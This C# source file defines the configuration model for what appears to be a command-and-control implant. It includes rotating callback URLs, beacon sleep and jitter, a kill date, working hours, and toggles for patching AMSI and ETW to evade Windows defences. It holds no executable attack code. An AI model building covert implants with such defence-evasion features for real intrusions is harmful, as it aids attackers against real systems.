namespace Agent.Models
{
    public enum CallbackRotationType
    {
        Fallback,
        Sequential,
        RoundRobin,
        Random
    }

    public class AgentConfig
    {
        public string AgentId { get; set; } = string.Empty;

        public Dictionary<string, string> Headers { get; set; }

        public List<string> CallbackUrls { get; set; }
        public CallbackRotationType RotationType { get; set; } = CallbackRotationType.RoundRobin;

        public int RotationRetries { get; set; } = 500;

        public int Sleep { get; set; } = 5;

        // Jitter is a percentage here
        public int Jitter { get; set; } = 3;

        public DateTime? KillDate { get; set; }

        public DateTime WorkingHoursStart { get; set; }

        public DateTime WorkingHoursEnd { get; set; }

        public bool AmsiPatching { get; set; } = false;

        public bool ETWPatching { get; set; } = false;
    }
}
